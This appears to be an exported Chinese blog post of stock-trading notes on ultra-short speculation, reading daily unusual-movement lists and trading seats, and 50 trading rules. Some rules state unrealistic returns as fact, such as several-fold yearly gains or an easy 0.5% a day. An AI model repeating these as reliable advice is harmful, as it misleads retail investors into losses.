《什么样的人不适合做超短》\n\n1.上班族，请不要做超短。\n\n2.没有强大的内心，股票随便动一下就激动的，请不要做超短。\n\n3.做不到一天四小时盯盘，盘后至少四个小时复盘的，请不要做超短。\n\n4.对技术面一窍不通的，请不要做超短。\n\n5.新入市两年内的韭菜，请不要做超短。\n\n6.没有独立思考判断能力的，请不要做超短。\n\n7.有家庭生活压力的，请不要做超短。\n\n8.盘中无法做到跟随应变的，请不要做超短。\n\n9.无法容忍回撤，做不好风控的，请不要做超短\n\n10.买卖点都在一瞬间，肾不好的，请不要做超短。\n\n## 《什么样的股票不能买》\n\n1、大势趋向空时，不买，买多不买空\n\n2、整体板块走势不好时，不买，龙头板块，行情需要3、30日均线正在下降或股价处于30日均线下方的，不买，破生命线\n\n4、股性不好的股票，不买，买股买善庄\n\n5、突破点成交量表现不佳的，不买。换手率不够不买\n\n6、成交量巨量时不买，巨量止盈不买\n\n7、能量或动量过大时不买，涨幅过高却没有调整不买\n\n8、技术指标不成熟的股票，不买，油未加足\n\n9、当价格趋势后势不明朗时不买，方向不明不买\n\n10、不具有宽广底部的股票不买，横有多长，竖有多高\n\n11、正在缓慢下跌，已走下降通道的个股，不买，下水道中无好货\n\n12、曾被恶炒过，庄家已撤离或正在撤离的个股，不买，花无百日红\n\n13、盘整时期，在盘中突然拉起一根大阳线的股票，不买，积弱难返\n\n14、突破盘局后，已出现连续三根大阳线且无调整（30%以上）不买\n\n15、第一次冲高到前期高点附近，只要不涨停不买，挑顶卖货\n\n16、不具备短均线多头排列不买，均线不好\n\n17、不论走势如何好，也不买涨势发动太久之后的股票，追高不买\n\n18、宁可错过一次赚钱的机会，也不买任何风险大于报酬的个股\n\n19、只要身在股市，就永远不猜测底部，也不预测顶部，终生顺势而为\n\n20、每波行情中，总有主流、支流、末流（跟风）板块之分，要想跑赢大势，就必须紧跟主流板块，特别是领涨股！骑马要骑大黑马，买股要买龙头股\n\n## 纪律篇\n\n1.炒作题材股就是讲故事，不管故事是真的还是假的，只要讲的好就行。　　\n\n2.成交量已很小很长时间了，只要量不放大就以横盘下跌为主，可以先出来，即使反弹如果量还这么小的话高度有限。等成交量大了再进去，免得在里面受折磨。　　\n\n3.不要买入太多的太便宜的股票，低于5元的股票都是很垃圾的，不要以为便宜就不跌了，往往这样的股票反弹的很慢，重点关注10元左右的股票，活跃度比较高。　　\n\n4.选择自己熟悉的股票进行投资，对于熟悉的股票，我们已经知道它的“脾气”，知道何时买何时卖。    \n\n5.买股票一定要冷静，必须有80%以上的把握，宁愿踏空也不要被套。赚钱了卖股可以随意一些，只是赚多赚少的问题。一定要锻炼自己的心理克服盲目追高。　　\n\n6.图很好已经形成了底部，并且持续放量依托5日线稳步上涨，符合我的选股标准。　　\n\n7.股性不活跃，比中石油和工行还笨，涨的很慢，被这样的股票套上了很麻烦。即使大盘再创新高这只股票也涨不了多少。　　\n\n8.不要受消息影响，去买所谓的抄底股，你不是庄家，不可能知道此时购买的就一定是股票最低价，所以在选股票的时候，要选走势强，升势最好的股票。　　\n\n9.买点非常关键，不论在什么行情，除非特别强势股，最好是逢低介入。    \n\n10.理智投资，克制情绪，投资股票要有良好的心理素质。股民通常都会对股票的涨跌产生情绪化，从而影响操作。切忌不可情绪化，一定要学会自我控制，理智投资。有时股民们会由于一时冲动而贸然建仓，也有时候会和某一支股票“较劲”，斩仓在“地板价”上。机会随时都会出现，没必要因一时冲动而导致资金大损。　　\n\n11.买股票不论哪个板快都要买龙头，我所说的龙头股不是名气大的盘子大的而是涨的多的、涨的快的股票。同样上涨龙头股比其他跟风的要多涨很多，而且又抗跌。要买就要买龙头股票，不能因为涨的多不敢买。比如近期的乐视网、全通教育等。　　\n\n12.在弱势中突破新高的股票值得重点关注。　　\n\n13.短线操作具备以下几个条件\n\n    1、要有原则不要计较一天的得失要敢于止损。\n    2、喜欢追热点要有胆量不怕追高。\n    3、我一般在开盘15分钟和收盘前30分钟买股票。　　\n\n14.大家买股票除了看指数外还要看上海市场涨幅超过6%的股票有多少，如果太少的话就不要参与。    \n\n15.止损和控制仓位是炒股的第一步，第二步就要锻炼自己的心理素质。在行情不好的时候尽量少参与，甚至一个星期买一次，每一次赚3%一年你也能赚很多。　　\n\n16.不但要有好股票，更重要的是买点和卖点，后者更关键这个只能靠自己把握。　　\n\n17.买的股票主要有以下三类\n\n    1.突破箱式震荡创新高的\n    2.热点题材股\n    3。底部放量的特别是现在形成头肩底或者双底走势的。　　\n\n18.如果资金不是很多的话股票最好不要超过3个。行情好的时候一般是2个行情不好的时候就1个。　　\n\n19.大盘在大幅上涨的时候一定要避免操作频繁，大盘震荡或下跌的时候频繁操作是好的。    \n\n20.大家以后买股票一定学习买点，再好的股票买高了也赚不到钱，再差的股票买的位置低也能赚钱。买卖点很关键甚至比股票好坏还重要。这个需要自己多观察多总结经验，最起码要学会看均线，短线看5日、10日线。大盘好的情况下，强势股调整一般不会破5日线，大盘差的时候顶多到10日线10日线是很好的介入机会。如果你大多数时间都在空仓专等强势股跌到10日线介入，假设一个月有3次这样的机会，每次赚8%，一年你都会赚好几倍。　　\n\n21.做短线要学会卖，不管手中的股票是涨是跌。在大盘不好的情况下只要手中的股票拉升，分批卖出以规避风险就没错。　　\n\n22.注重成交量，量在价先。看股主要看成交量，看成交量不用看K线图，基本就能知道一个股票的走势。　　\n\n23.我喜欢操作创新高的股票，一般来说创了新高的股票不会跌破前期的高点。这样的股票没有套牢盘，涨起来比较轻松，大都有比较凶悍的主力运作。买这样的股票是比较安全的。　　\n\n24.满仓持有一个股票，每天做T+0差价赚0.5%，难度并不大，一个月下来也有不错的收益。做T+0价差一定不能贪心要不很容易踏空。如果买入做差价，赚了一点卖一点，一边涨一边卖，防止一下跌很多。    \n\n25.果断出手，切忌犹豫不决。犹豫不决容易错失投资时机，在关键时期患得患失，不能把握到最佳的时机，说明他们对市场行情还没有准确的判断。在交易时要看成交量，如果指数大跌且成交量降到均量的一半以下，此时买进风险很低，正是投资的最佳时机，股民们应抓住这个时机，果断出手，切不可犹豫不决。　　\n\n26.从心理学的角度来说，越是认为是政策底往往就会跌破政策底。而且基金不讲政治，政府又出台不了实质性的政策，政策底往往是守不住的。　　\n\n27.大盘上方均线密集，没有一定的成交量是不可能突破的，即使突破了也会跌下来，所谓量在价先就是这个道理。　　\n\n28.KDJ中轴上方金叉不是坏事说明强势，这也是一直横盘整理的结果，BOLL线收窄选择方向。　　\n\n29.次新股最好不要碰这些股发行价都很高严重高估，上市后都要补跌。   \n\n30.缺口补的时间越长，大盘横盘的时间越长，对后市发展就越不利。　　\n\n31.炒股不能与趋势做对，更不能一相情愿。老是往好的地方想，总是想自己买的股票一定要涨。认为自己满仓了大盘明天肯定不会跌了。总是报有幻想在股市中是要不得的。　　\n\n32.波浪理论简单的说主要是上升5大浪，下跌3小浪，每一大浪又有多个小浪组成。虽然有马后炮的嫌疑，但从长远来看还是有很大借鉴意义的。　　\n\n33.我分析股票最重要的一个指标是成交量，一般来说股票要持续上涨必须要成交量放大，特别是股票技术横盘整理或向上突破重要点位必须拌有成交量放大。在连续上涨的股票中，只要当天的成交量高于上一天的成交量，如果大盘没有太大问题股票还是会冲高的。另除了成交量外首先要学会看均线排列和K线形态。掌握了这些基本就可以了。还有一些MACD、KDJ、BOLL等指标也比较常用，一般高手看了前面的均线排列、K线形态就知道后面这些指标的走势。当然分析的越全面越好多个指标同时用对股票把握的更准一些。　　\n\n34.一般来说能够连续拉升的股票，中后期一般开盘价不能超过2，如果过了说明庄家高开要放货了，一般低开1-2之间最好。    \n\n35.不要开盘就抛，这是一大忌。中间会有冲高的机会。　　\n\n36.当天要拉升的股票，一般来说控盘程度高，大盘跌它不怎么跌。对于短期涨幅不大的股票，波动空间很小上下不超过\n\n2。偶尔出现庄家对倒说明股票有异动。短期涨幅大的股票往往要下探到5日线。股票要拉升成交量要放大，一看放量了第一时间介入比晚介入要好。　　\n\n37.短线不入大盘股，短线不入机构重仓股，短线不入大小非股。　　\n\n38.股市的高手最主要的不是技术而是心理。只有心理成熟了你才能驾御这个市场。人的心理、性格、志向在股票操作中暴漏无遗。　　\n\n39.一般来说不要买跌停板上的股票。       \n\n40.不要受消息影响，去买所谓的抄底股，你不是庄家，不可能知道此时购买的就一定是股票最低价，所以在选股票的时候，要选走势强，升势最好的股票。　　\n\n41.永远不要相信电视台的股评“老师们”。如果他们真能说对明天哪只股票涨停，还有必要从事股评这份“很有前途的职业”么？　　\n\n42.你抓住一个股票的K线图，看了又看最终你会发现规律。　　\n\n43.普涨行情下不要频繁换股，普涨行情下买股票很容易被套要买就等收盘前2分钟买，因为好股票都涨停了，差的股票你买后很容易回落。　　\n\n44.强势股如果趁大盘跌而下跌，是很好的介入机会。       \n\n45.更多的人可能有这样的想法：如果买了这个股票总是想这个股票好的一面，不想它差的一面，甚至更听不进去别人说他不好。这种情况就是心理学中的选择性扭曲。　　\n\n46.一个股票虽然看好，但不一定什么时间都可以买。股票的买点和卖点非常关键比选择股票还重要。再好的股票没买到好位置也赚不了钱。所以如果错过了买入的机会，不要看到别人赚钱自己心理不平衡贸然就冲进去了，结果买在了最高点这是一大忌。克服了这一个毛病就能能成为股市的高手。　　\n\n48.有基金的股票很难大涨的，一涨它就卖。　　\n\n49.一大阴击穿所有的均线，应该也是离场的信号。　　\n\n50.大盘跳水不要急于卖股票等它再反弹一波的高点卖。更不能在急跌的时候卖股票这样很容易卖在最低价。\n\n## 《龙虎榜》\n\n看龙虎榜主要是为了揣摩当前市场中最活跃，最顶尖的资金操盘的思路，不管是机构也好游资也好，这些活跃在市场最前沿的资金基本代表了国内最顶尖的操盘水平。而通过龙虎榜观察他们的选股与操盘手法使自己的操作逻辑尽可能靠近市场主流资金的逻辑，这才是龙虎榜最大的意义，因为这些资金特别是游资基本都是小资金做大的，处于整个股市生物链的顶部。\n\n首先，什么是龙虎榜？龙虎榜是交易所公布的当日异动股票汇总。上榜主要有四个条件：1、日价格涨幅偏离值±7%\n\n2、日换手率达到20%\n\n3、日价格振幅达到15%\n\n4、连续三个交易日内，涨幅偏离值累计达到20%每个条件都选前3名的上榜，深市是分主板、中小板、创业板分别取前3的。具体的大家百度百科，解释龙虎榜不是今天的重点。\n\n大家应该看到了我上面加粗的两个字“异动”，关键就在这异动上面。谁才有能力让股票的价格出现异动，只有所谓的主力，散户的散单是肯定做不到的，说到主力很多人觉得很神秘，而且喜欢把机构统称主力，其实大家不必太看重名词上的东西，只要是能影响到股价走势的都是可以称为主力，包括机构跟游资。研究散户你永远只能是散户，只有研究主力才能让你进步，而龙虎榜就是我们研究主力操盘选股思路的最好窗口。其次，怎么看龙虎榜？龙虎榜上有两种席位，一种是机构席位，一种是游资席位。机构席位就是什么公募啊、私募啊等等法人账户，他们的资金一般是募集而来，且上榜统一名称为“机构专用”，所以没什么好研究的。而游资席位不一样，游资席位都是自然人账户，就是跟广大散户朋友账户一样的。且游资大部分都是从小资金做起来，而且可以持续跟踪关注，他们才是我们研究对象。","source":"_posts/[finance]-top-pop-stock.md","raw":"---\nlayout: title\ntitle: 业余时间开始二级市场交易\ndate: 2017-04-12 09:11:06\ntags: finance\ncategories: Lifestyle\n---\n\n所以就要做一些笔记呗\n\n有一些摘自知乎和雪球。观点和意见都不尽同意。\n\n\n## 《如何看懂龙虎榜》\n\n一、纯游资对决(交易席位均为游资)  \n\n1、买卖双方力量比对，买方总金额越大越好。买方席位前5名的总资金要远大于卖方席位前5名总资金。并且买一的资金要远大于卖一的资金，最好是1.5倍以上。而买一和买二的金额差不能太大，否则会容易造成一家独大，后市意味着抛压也大。\n\n2、如果是第一次涨停，在龙虎榜交易数据当中，买方数据为纯买入最好，表示新进资金入场后市还将走高。另外第一次涨停后留意买一席位是直接出局、锁仓、继续加码买进还是做差价？通常直接出局代表了行情一日游，锁仓说明行情可持续，等待别的资金接力拉高。继续加码买进表示强烈看好。做差价说明买一实力不够强。个股的大行情都是游资接力完成的，不会是某一个游资来推动整轮行情的发展。因此通常2-3个涨停之后如果买一继续锁仓，别的游资只会是观望了，因为持仓量太大造成的抛压也大。只有当买一出局后，别的游资才考虑进场接力拉升。所以说行情的初中期换手率是一个非常重要的参考指标。一个游资的离去会吸引另外游资的进驻。另外还有一种情况就是边拉升边对倒的游资，对倒涨停是为了投入少量的资金来达到涨停效应，持续力不会太强。\n\n3、留意游资的身份和操盘风格，是一线知名游资还是名不见经传的游资？在最近是否经常上榜？操盘风格如何？一日游为主还是波段为主或者是喜欢与机构共舞等等。通常一日游资口碑不太好，上榜了也不会对行情有推动作用，反而打击做多的积极性。波段游资则比较受欢迎。\n\n4、留意龙虎榜数据买方席位知名度，越知名越好，数量越多越好。比如银河绍兴路、光大杭州庆春路、光大奉化南山路、财通温岭东辉北路、中信杭州延安路、中信杭州定安路、华泰益田路荣超商务中心等这些著名游资出现3个以上，代表着一线游资对这个题材个股的高度认可，后市持续力强。\n\n二、游资和机构博弈(交易席位为游资机构混杂)\n\n1、买方中机构出现的数量越多越好，机构当日买入金额占总成交金额比例越大越好。一次性锁定筹码集中度越高越好。因为多家机构进驻的个股基本面都比较不错，符合市场调研评判的标准，通常引发中级行情！当游资和机构达成共识合力推升股价，短线往往爆发力比较强，后市继续上涨概率也很大。\n\n2、买方中的买一席位是机构最好，并且卖方的5个席位中不出现机构最好；\n\n3、如果买方席位和卖方席位均有机构出现，卖方的5个席位中机构出现的数量越少越好，金额越小越好。如果卖方的机构席位比买方机构席位旗鼓相当甚至还要多，说明机构之间分歧非常之大，短期方向具有不确定性，对于交易数据当中的游资席位来说也会打退堂鼓，应该观望等待明朗。\n\n4、当买方5个席位均为游资，而卖方所有席位均为机构的时候，说明机构早就有出局的想法，有可能是该股基本面发生了转变，或者其他的不确定性让机构调仓换股。另外这种情况也经常发生在股价炒作末期的高位，机构认为风险较大时就会组团出货，通常砸至跌停。\n\n5、当买方均为机构卖方全部为游资席位，如果股价已经在炒作高位，发生这样的交易数据则机构有利益输送嫌疑，利用机构效应吸引散户高位接盘来帮助游资顺利出货。记住：市场上没有100%的完美，太美好的东西其背后一定掩饰着什么。\n\n\n## 超短\n\n以下是一个很激进的原则，并不能认可太多\n\n超短线的精髓在于做的是自己市值的主升浪，而不是某支股票的主升浪。从百万到千万到亿，是做人生的主升浪。这个大逻辑必须非常清楚。我很懂，自己为何做超短线！目标必须是亿为单位，不能目光短浅！我的操作纪律：\n\n1.永不抄底，只做强势股追涨，只做上升通道。\n\n2.不做日成交额低于5亿的股票。\n\n3.持股周期1~3天，连扳预期除外，坚决不把超短投机失败了当价值投资来搞。\n\n4.只选热点概念和有板块效应的标，判断失败搞错热点果断割肉出货，热点持续卖飞再买回来，老想卖山顶的都是屌丝，卖飞买回来才是高富帅。\n\n5.只做牛票，不做牛市，宁可卖飞，也不傻等。\n\n选择交易这一行，挫折感和失败感会伴随我们一生，失败时我们会郁闷、会痛苦、会绝望；胜利时，我们会目空一切，以为自己掌握了股市赚钱的法宝，这些将会重复，未来将战无不胜，万亿富翁指日可待。交易虽时而欲哭无泪，时而高兴流泪，但我们却依然爱它，因为平淡的生活乏味，挑战的生活才有激情，才有梦想。在预判中跟随， 在跟随中应变，没有预判的跟随是盲从， 没有应变的预判是意淫。找对路，并坚持！\n\n生活里注定会有许多风雨，认识人生是一种欣然的态度和热爱，一路上的经过，如果你坚持不下去了，请想想当初的那般热情。股市常有迷茫的时候，只要熬过了，就没什么可以打败你。\n\n> 它文章挺老了，但是毕竟是经验\n\n## 《什么样的人不适合做超短》\n\n1.上班族，请不要做超短。\n\n2.没有强大的内心，股票随便动一下就激动的，请不要做超短。\n\n3.做不到一天四小时盯盘，盘后至少四个小时复盘的，请不要做超短。\n\n4.对技术面一窍不通的，请不要做超短。\n\n5.新入市两年内的韭菜，请不要做超短。\n\n6.没有独立思考判断能力的，请不要做超短。\n\n7.有家庭生活压力的，请不要做超短。\n\n8.盘中无法做到跟随应变的，请不要做超短。\n\n9.无法容忍回撤，做不好风控的，请不要做超短\n\n10.买卖点都在一瞬间，肾不好的，请不要做超短。\n\n## 《什么样的股票不能买》\n\n1、大势趋向空时，不买，买多不买空\n\n2、整体板块走势不好时，不买，龙头板块，行情需要3、30日均线正在下降或股价处于30日均线下方的，不买，破生命线\n\n4、股性不好的股票，不买，买股买善庄\n\n5、突破点成交量表现不佳的，不买。换手率不够不买\n\n6、成交量巨量时不买，巨量止盈不买\n\n7、能量或动量过大时不买，涨幅过高却没有调整不买\n\n8、技术指标不成熟的股票，不买，油未加足\n\n9、当价格趋势后势不明朗时不买，方向不明不买\n\n10、不具有宽广底部的股票不买，横有多长，竖有多高\n\n11、正在缓慢下跌，已走下降通道的个股，不买，下水道中无好货\n\n12、曾被恶炒过，庄家已撤离或正在撤离的个股，不买，花无百日红\n\n13、盘整时期，在盘中突然拉起一根大阳线的股票，不买，积弱难返\n\n14、突破盘局后，已出现连续三根大阳线且无调整（30%以上）不买\n\n15、第一次冲高到前期高点附近，只要不涨停不买，挑顶卖货\n\n16、不具备短均线多头排列不买，均线不好\n\n17、不论走势如何好，也不买涨势发动太久之后的股票，追高不买\n\n18、宁可错过一次赚钱的机会，也不买任何风险大于报酬的个股\n\n19、只要身在股市，就永远不猜测底部，也不预测顶部，终生顺势而为\n\n20、每波行情中，总有主流、支流、末流（跟风）板块之分，要想跑赢大势，就必须紧跟主流板块，特别是领涨股！骑马要骑大黑马，买股要买龙头股\n\n## 纪律篇\n\n1.炒作题材股就是讲故事，不管故事是真的还是假的，只要讲的好就行。　　\n\n2.成交量已很小很长时间了，只要量不放大就以横盘下跌为主，可以先出来，即使反弹如果量还这么小的话高度有限。等成交量大了再进去，免得在里面受折磨。　　\n\n3.不要买入太多的太便宜的股票，低于5元的股票都是很垃圾的，不要以为便宜就不跌了，往往这样的股票反弹的很慢，重点关注10元左右的股票，活跃度比较高。　　\n\n4.选择自己熟悉的股票进行投资，对于熟悉的股票，我们已经知道它的“脾气”，知道何时买何时卖。    \n\n5.买股票一定要冷静，必须有80%以上的把握，宁愿踏空也不要被套。赚钱了卖股可以随意一些，只是赚多赚少的问题。一定要锻炼自己的心理克服盲目追高。　　\n\n6.图很好已经形成了底部，并且持续放量依托5日线稳步上涨，符合我的选股标准。　　\n\n7.股性不活跃，比中石油和工行还笨，涨的很慢，被这样的股票套上了很麻烦。即使大盘再创新高这只股票也涨不了多少。　　\n\n8.不要受消息影响，去买所谓的抄底股，你不是庄家，不可能知道此时购买的就一定是股票最低价，所以在选股票的时候，要选走势强，升势最好的股票。　　\n\n9.买点非常关键，不论在什么行情，除非特别强势股，最好是逢低介入。    \n\n10.理智投资，克制情绪，投资股票要有良好的心理素质。股民通常都会对股票的涨跌产生情绪化，从而影响操作。切忌不可情绪化，一定要学会自我控制，理智投资。有时股民们会由于一时冲动而贸然建仓，也有时候会和某一支股票“较劲”，斩仓在“地板价”上。机会随时都会出现，没必要因一时冲动而导致资金大损。　　\n\n11.买股票不论哪个板快都要买龙头，我所说的龙头股不是名气大的盘子大的而是涨的多的、涨的快的股票。同样上涨龙头股比其他跟风的要多涨很多，而且又抗跌。要买就要买龙头股票，不能因为涨的多不敢买。比如近期的乐视网、全通教育等。　　\n\n12.在弱势中突破新高的股票值得重点关注。　　\n\n13.短线操作具备以下几个条件\n\n    1、要有原则不要计较一天的得失要敢于止损。\n    2、喜欢追热点要有胆量不怕追高。\n    3、我一般在开盘15分钟和收盘前30分钟买股票。　　\n\n14.大家买股票除了看指数外还要看上海市场涨幅超过6%的股票有多少，如果太少的话就不要参与。    \n\n15.止损和控制仓位是炒股的第一步，第二步就要锻炼自己的心理素质。在行情不好的时候尽量少参与，甚至一个星期买一次，每一次赚3%一年你也能赚很多。　　\n\n16.不但要有好股票，更重要的是买点和卖点，后者更关键这个只能靠自己把握。　　\n\n17.买的股票主要有以下三类\n\n    1.突破箱式震荡创新高的\n    2.热点题材股\n    3。底部放量的特别是现在形成头肩底或者双底走势的。　　\n\n18.如果资金不是很多的话股票最好不要超过3个。行情好的时候一般是2个行情不好的时候就1个。　　\n\n19.大盘在大幅上涨的时候一定要避免操作频繁，大盘震荡或下跌的时候频繁操作是好的。    \n\n20.大家以后买股票一定学习买点，再好的股票买高了也赚不到钱，再差的股票买的位置低也能赚钱。买卖点很关键甚至比股票好坏还重要。这个需要自己多观察多总结经验，最起码要学会看均线，短线看5日、10日线。大盘好的情况下，强势股调整一般不会破5日线，大盘差的时候顶多到10日线10日线是很好的介入机会。如果你大多数时间都在空仓专等强势股跌到10日线介入，假设一个月有3次这样的机会，每次赚8%，一年你都会赚好几倍。　　\n\n21.做短线要学会卖，不管手中的股票是涨是跌。在大盘不好的情况下只要手中的股票拉升，分批卖出以规避风险就没错。　　\n\n22.注重成交量，量在价先。看股主要看成交量，看成交量不用看K线图，基本就能知道一个股票的走势。　　\n\n23.我喜欢操作创新高的股票，一般来说创了新高的股票不会跌破前期的高点。这样的股票没有套牢盘，涨起来比较轻松，大都有比较凶悍的主力运作。买这样的股票是比较安全的。　　\n\n24.满仓持有一个股票，每天做T+0差价赚0.5%，难度并不大，一个月下来也有不错的收益。做T+0价差一定不能贪心要不很容易踏空。如果买入做差价，赚了一点卖一点，一边涨一边卖，防止一下跌很多。    \n\n25.果断出手，切忌犹豫不决。犹豫不决容易错失投资时机，在关键时期患得患失，不能把握到最佳的时机，说明他们对市场行情还没有准确的判断。在交易时要看成交量，如果指数大跌且成交量降到均量的一半以下，此时买进风险很低，正是投资的最佳时机，股民们应抓住这个时机，果断出手，切不可犹豫不决。　　\n\n26.从心理学的角度来说，越是认为是政策底往往就会跌破政策底。而且基金不讲政治，政府又出台不了实质性的政策，政策底往往是守不住的。　　\n\n27.大盘上方均线密集，没有一定的成交量是不可能突破的，即使突破了也会跌下来，所谓量在价先就是这个道理。　　\n\n28.KDJ中轴上方金叉不是坏事说明强势，这也是一直横盘整理的结果，BOLL线收窄选择方向。　　\n\n29.次新股最好不要碰这些股发行价都很高严重高估，上市后都要补跌。   \n\n30.缺口补的时间越长，大盘横盘的时间越长，对后市发展就越不利。　　\n\n31.炒股不能与趋势做对，更不能一相情愿。老是往好的地方想，总是想自己买的股票一定要涨。认为自己满仓了大盘明天肯定不会跌了。总是报有幻想在股市中是要不得的。　　\n\n32.波浪理论简单的说主要是上升5大浪，下跌3小浪，每一大浪又有多个小浪组成。虽然有马后炮的嫌疑，但从长远来看还是有很大借鉴意义的。　　\n\n33.我分析股票最重要的一个指标是成交量，一般来说股票要持续上涨必须要成交量放大，特别是股票技术横盘整理或向上突破重要点位必须拌有成交量放大。在连续上涨的股票中，只要当天的成交量高于上一天的成交量，如果大盘没有太大问题股票还是会冲高的。另除了成交量外首先要学会看均线排列和K线形态。掌握了这些基本就可以了。还有一些MACD、KDJ、BOLL等指标也比较常用，一般高手看了前面的均线排列、K线形态就知道后面这些指标的走势。当然分析的越全面越好多个指标同时用对股票把握的更准一些。　　\n\n34.一般来说能够连续拉升的股票，中后期一般开盘价不能超过2，如果过了说明庄家高开要放货了，一般低开1-2之间最好。    \n\n35.不要开盘就抛，这是一大忌。中间会有冲高的机会。　　\n\n36.当天要拉升的股票，一般来说控盘程度高，大盘跌它不怎么跌。对于短期涨幅不大的股票，波动空间很小上下不超过\n\n2。偶尔出现庄家对倒说明股票有异动。短期涨幅大的股票往往要下探到5日线。股票要拉升成交量要放大，一看放量了第一时间介入比晚介入要好。　　\n\n37.短线不入大盘股，短线不入机构重仓股，短线不入大小非股。　　\n\n38.股市的高手最主要的不是技术而是心理。只有心理成熟了你才能驾御这个市场。人的心理、性格、志向在股票操作中暴漏无遗。　　\n\n39.一般来说不要买跌停板上的股票。       \n\n40.不要受消息影响，去买所谓的抄底股，你不是庄家，不可能知道此时购买的就一定是股票最低价，所以在选股票的时候，要选走势强，升势最好的股票。　　\n\n41.永远不要相信电视台的股评“老师们”。如果他们真能说对明天哪只股票涨停，还有必要从事股评这份“很有前途的职业”么？　　\n\n42.你抓住一个股票的K线图，看了又看最终你会发现规律。　　\n\n43.普涨行情下不要频繁换股，普涨行情下买股票很容易被套要买就等收盘前2分钟买，因为好股票都涨停了，差的股票你买后很容易回落。　　\n\n44.强势股如果趁大盘跌而下跌，是很好的介入机会。       \n\n45.更多的人可能有这样的想法：如果买了这个股票总是想这个股票好的一面，不想它差的一面，甚至更听不进去别人说他不好。这种情况就是心理学中的选择性扭曲。　　\n\n46.一个股票虽然看好，但不一定什么时间都可以买。股票的买点和卖点非常关键比选择股票还重要。再好的股票没买到好位置也赚不了钱。所以如果错过了买入的机会，不要看到别人赚钱自己心理不平衡贸然就冲进去了，结果买在了最高点这是一大忌。克服了这一个毛病就能能成为股市的高手。　　\n\n48.有基金的股票很难大涨的，一涨它就卖。　　\n\n49.一大阴击穿所有的均线，应该也是离场的信号。　　\n\n50.大盘跳水不要急于卖股票等它再反弹一波的高点卖。更不能在急跌的时候卖股票这样很容易卖在最低价。\n\n## 《龙虎榜》\n\n看龙虎榜主要是为了揣摩当前市场中最活跃，最顶尖的资金操盘的思路，不管是机构也好游资也好，这些活跃在市场最前沿的资金基本代表了国内最顶尖的操盘水平。而通过龙虎榜观察他们的选股与操盘手法使自己的操作逻辑尽可能靠近市场主流资金的逻辑，这才是龙虎榜最大的意义，因为这些资金特别是游资基本都是小资金做大的，处于整个股市生物链的顶部。\n\n首先，什么是龙虎榜？龙虎榜是交易所公布的当日异动股票汇总。上榜主要有四个条件：1、日价格涨幅偏离值±7%\n\n2、日换手率达到20%\n\n3、日价格振幅达到15%\n\n4、连续三个交易日内，涨幅偏离值累计达到20%每个条件都选前3名的上榜，深市是分主板、中小板、创业板分别取前3的。具体的大家百度百科，解释龙虎榜不是今天的重点。\n\n大家应该看到了我上面加粗的两个字“异动”，关键就在这异动上面。谁才有能力让股票的价格出现异动，只有所谓的主力，散户的散单是肯定做不到的，说到主力很多人觉得很神秘，而且喜欢把机构统称主力，其实大家不必太看重名词上的东西，只要是能影响到股价走势的都是可以称为主力，包括机构跟游资。研究散户你永远只能是散户，只有研究主力才能让你进步，而龙虎榜就是我们研究主力操盘选股思路的最好窗口。其次，怎么看龙虎榜？龙虎榜上有两种席位，一种是机构席位，一种是游资席位。机构席位就是什么公募啊、私募啊等等法人账户，他们的资金一般是募集而来，且上榜统一名称为“机构专用”，所以没什么好研究的。而游资席位不一样，游资席位都是自然人账户，就是跟广大散户朋友账户一样的。且游资大部分都是从小资金做起来，而且可以持续跟踪关注，他们才是我们研究对象。","slug":"[finance]-top-pop-stock","published":1,"updated":"2019-03-11T04:32:07.135Z","comments":1,"photos":[],"link":"","_id":"ckkljsasc0013r242fwi7bb54","content":"<p>所以就要做一些笔记呗</p>\n<p>有一些摘自知乎和雪球。观点和意见都不尽同意。</p>\n<h2 id=\"《如何看懂龙虎榜》\"><a href=\"#《如何看懂龙虎榜》\" class=\"headerlink\" title=\"《如何看懂龙虎榜》\"></a>《如何看懂龙虎榜》</h2><p>一、纯游资对决(交易席位均为游资)  </p>\n<p>1、买卖双方力量比对，买方总金额越大越好。买方席位前5名的总资金要远大于卖方席位前5名总资金。并且买一的资金要远大于卖一的资金，最好是1.5倍以上。而买一和买二的金额差不能太大，否则会容易造成一家独大，后市意味着抛压也大。</p>\n<p>2、如果是第一次涨停，在龙虎榜交易数据当中，买方数据为纯买入最好，表示新进资金入场后市还将走高。另外第一次涨停后留意买一席位是直接出局、锁仓、继续加码买进还是做差价？通常直接出局代表了行情一日游，锁仓说明行情可持续，等待别的资金接力拉高。继续加码买进表示强烈看好。做差价说明买一实力不够强。个股的大行情都是游资接力完成的，不会是某一个游资来推动整轮行情的发展。因此通常2-3个涨停之后如果买一继续锁仓，别的游资只会是观望了，因为持仓量太大造成的抛压也大。只有当买一出局后，别的游资才考虑进场接力拉升。所以说行情的初中期换手率是一个非常重要的参考指标。一个游资的离去会吸引另外游资的进驻。另外还有一种情况就是边拉升边对倒的游资，对倒涨停是为了投入少量的资金来达到涨停效应，持续力不会太强。</p>\n<p>3、留意游资的身份和操盘风格，是一线知名游资还是名不见经传的游资？在最近是否经常上榜？操盘风格如何？一日游为主还是波段为主或者是喜欢与机构共舞等等。通常一日游资口碑不太好，上榜了也不会对行情有推动作用，反而打击做多的积极性。波段游资则比较受欢迎。</p>\n<p>4、留意龙虎榜数据买方席位知名度，越知名越好，数量越多越好。比如银河绍兴路、光大杭州庆春路、光大奉化南山路、财通温岭东辉北路、中信杭州延安路、中信杭州定安路、华泰益田路荣超商务中心等这些著名游资出现3个以上，代表着一线游资对这个题材个股的高度认可，后市持续力强。</p>\n<p>二、游资和机构博弈(交易席位为游资机构混杂)</p>\n<p>1、买方中机构出现的数量越多越好，机构当日买入金额占总成交金额比例越大越好。一次性锁定筹码集中度越高越好。因为多家机构进驻的个股基本面都比较不错，符合市场调研评判的标准，通常引发中级行情！当游资和机构达成共识合力推升股价，短线往往爆发力比较强，后市继续上涨概率也很大。</p>\n<p>2、买方中的买一席位是机构最好，并且卖方的5个席位中不出现机构最好；</p>\n<p>3、如果买方席位和卖方席位均有机构出现，卖方的5个席位中机构出现的数量越少越好，金额越小越好。如果卖方的机构席位比买方机构席位旗鼓相当甚至还要多，说明机构之间分歧非常之大，短期方向具有不确定性，对于交易数据当中的游资席位来说也会打退堂鼓，应该观望等待明朗。</p>\n<p>4、当买方5个席位均为游资，而卖方所有席位均为机构的时候，说明机构早就有出局的想法，有可能是该股基本面发生了转变，或者其他的不确定性让机构调仓换股。另外这种情况也经常发生在股价炒作末期的高位，机构认为风险较大时就会组团出货，通常砸至跌停。</p>\n<p>5、当买方均为机构卖方全部为游资席位，如果股价已经在炒作高位，发生这样的交易数据则机构有利益输送嫌疑，利用机构效应吸引散户高位接盘来帮助游资顺利出货。记住：市场上没有100%的完美